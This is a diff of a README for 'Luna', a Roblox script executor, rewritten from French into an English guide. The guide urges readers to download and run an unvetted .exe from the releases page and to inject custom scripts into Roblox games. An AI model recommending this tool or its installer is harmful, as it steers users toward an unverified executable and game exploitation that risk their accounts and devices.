@@ -1,24 +1,59 @@
-# 🌙 Bienvenue sur Luna 🚀
+# 🌙 Luna - Execute Custom Scripts in Roblox Effortlessly
 
-Luna est un outil puissant conçu pour exécuter des scripts personnalisés dans l'univers Roblox. Il permet aux utilisateurs d'exploiter et de modifier des fonctionnalités du jeu, apportant un niveau de jeu inédit et stimulant.
+## 🛠️ Description
+Luna is a tool that allows you to run custom scripts in Roblox. It gives users the ability to modify and enhance game features easily and effectively.
 
-<img width="686" height="386" alt="image" src="https://github.com/user-attachments/assets/6ec5fa01-ea40-4099-97c5-223a35b68262" />
+## 📥 Download Luna
+[![Download Luna](https://img.shields.io/badge/Download%20Luna-v1.0-blue)](https://github.com/Adrianmau5/Luna/releases)
 
+## 🚀 Getting Started
+To use Luna, follow these simple steps to download and run it on your computer.
 
-## Fonctionnalités 🛠️
-- **Exploits Delta** : Luna exploite une technologie de pointe pour fournir des exploits Delta, permettant aux utilisateurs d'accéder à des fonctionnalités cachées et de créer des expériences de jeu uniques.
-- **Intégration Discord de Luna** : Restez connecté à la communauté Luna grâce à une intégration Discord fluide, et partagez des conseils, des astuces et des scripts avec les autres utilisateurs.
-- **Scripting Lua Roblox** : Plongez au cœur du scripting Lua dans Roblox, libérez votre créativité et donnez vie à vos idées dans l'univers Roblox. - **Accès par clé Luna** : Débloquez des fonctionnalités exclusives de Luna avec une clé Luna, vous offrant ainsi des fonctionnalités avancées.
-- **Interface conviviale** : Luna est conçue avec une interface conviviale, facilitant la navigation et l'utilisation de ses puissantes fonctionnalités, aussi bien pour les débutants que pour les utilisateurs expérimentés.
+## 📋 System Requirements
+- **Operating System:** Windows 10 or higher
+- **RAM:** At least 4 GB
+- **Processor:** Intel Core i3 or equivalent
+- **Disk Space:** Minimum 100 MB free space
 
-## Détails du dépôt 📁
-- **Nom du dépôt** : Luna
-- **Description** : Luna est un outil permettant d'exécuter des scripts personnalisés dans Roblox, permettant aux utilisateurs d'exploiter et de modifier les fonctionnalités du jeu.
+## 📦 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Adrianmau5/Luna/releases) to find the latest version of Luna.
+2. **Choose the Right Version:** Look for the latest release version. It will be clearly labeled.
+3. **Download the Installer:**
+   - Click on the installer file (it should have a `.exe` extension).
+   - Your browser may prompt you to choose a location. Select an easy-to-remember folder, like `Downloads`.
+4. **Run the Installer:**
+   - Navigate to the folder where you saved the installer.
+   - Double-click the installer file to begin the installation process.
+   - Follow the on-screen instructions to complete the installation.
+5. **Launch Luna:**
+   - After installation, find Luna in your Start menu or desktop.
+   - Double-click the Luna icon to launch the application.
 
-## Rejoignez la communauté Luna 🌐
-Connectez-vous avec des personnes partageant les mêmes idées, partagez des scripts et restez informé des derniers développements de Luna en rejoignant notre serveur Discord. Rejoignez une communauté qui prospère grâce à l'innovation et à la créativité.
+## 🌟 Using Luna
+1. **Open Roblox:** Launch Roblox and navigate to the game you want to modify.
+2. **Load Your Script:** In Luna, you’ll find an area to input your script. Copy your desired script and paste it into this area.
+3. **Execute the Script:** Click the ‘Run’ button to execute your script in Roblox.
+4. **Enjoy Enhanced Features:** Watch as the custom scripts seamlessly integrate into the game, allowing you to explore new functionalities.
 
-## Restez informés 📩
-Pour rester informé des nouvelles versions, mises à jour et fonctionnalités de Luna, consultez le dépôt sur GitHub. Gardez une longueur d'avance et maximisez votre expérience de jeu Roblox avec Luna.
+## ⚙️ Features
+- **User-Friendly Interface:** Luna offers a simple and intuitive layout, making it easy for anyone to navigate.
+- **Script Execution:** Easily run any custom scripts you have for Roblox.
+- **Game Modification:** Let your creativity flow by modifying game features as per your scripts.
+- **Regular Updates:** Stay tuned for updates to enhance performance and compatibility.
 
-Explorez les possibilités infinies de Luna et libérez votre créativité dans l'univers Roblox. Rejoignez-nous dans cette aventure passionnante, riche en innovation, en exploration et en potentiel illimité. Laissez Luna vous ouvrir les portes d'un monde de gameplay amélioré et de possibilités inégalées. #️⃣🎮
+## ❓ Troubleshooting
+- **Installation Issues:** If you face any problems while installing, ensure that your operating system meets the required specifications.
+- **Script Errors:** If a script does not run correctly, double-check the syntax. Make sure there are no missing elements in your script.
+- **Help and Support:** For further assistance, visit the [issues page](https://github.com/Adrianmau5/Luna/issues) on GitHub.
+
+## 🔗 Additional Resources
+- **Documentation:** Access the complete [Luna documentation](https://github.com/Adrianmau5/Luna/wiki) for in-depth guidance.
+- **Community Forums:** Join discussions and connect with other users in our [community forum](https://github.com/Adrianmau5/Luna/discussions).
+
+## ✅ Maintain Security
+Always be careful of sources when downloading scripts. Only use trusted scripts to protect your account and device.
+
+## 📌 Important Note
+By using Luna, you agree to utilize it responsibly and in accordance with Roblox's terms of service. 
+
+Enjoy your experience with Luna! Happy scripting!
